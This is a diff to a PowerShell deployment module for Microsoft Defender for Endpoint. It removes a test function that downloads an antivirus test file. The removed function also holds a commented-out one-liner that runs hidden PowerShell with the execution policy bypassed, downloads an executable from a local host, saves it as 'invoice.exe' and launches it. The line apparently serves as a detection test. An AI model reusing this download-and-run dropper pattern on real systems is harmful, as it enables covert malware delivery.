@@ -39,12 +39,6 @@ Function Write-Log {
     }
 }
 
-Function Test-MDATPEICAR {
-    Write-Log "Connectivity test with an EICAR alert"
-    (New-Object Net.WebClient).DownloadFile("https://aka.ms/ioavtest", ($global:currentpath + "\ioav.exe"))
-    #powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
-}
-
 Function Confirm-MDATPInstallation {
     if ( ($null -eq $global:downloadLocation) -or ($null -eq $global:resultsDir)) {
         Write-Log "Download location path not set. Exiting" "ERROR"
@@ -1288,7 +1282,6 @@ Export-ModuleMember -Function Uninstall-Windows2008R2
 Export-ModuleMember -Function Uninstall-Windows2012R2
 Export-ModuleMember -Function Uninstall-Windows2016
 Export-ModuleMember -Function Uninstall-Windows2019
-Export-ModuleMember -Function Test-MDATPEICAR
 Export-ModuleMember -Function Confirm-MDATPInstallation
 Export-ModuleMember -Function Set-WindowsSecuritySettings
 Export-ModuleMember -Function OnboardingEDR
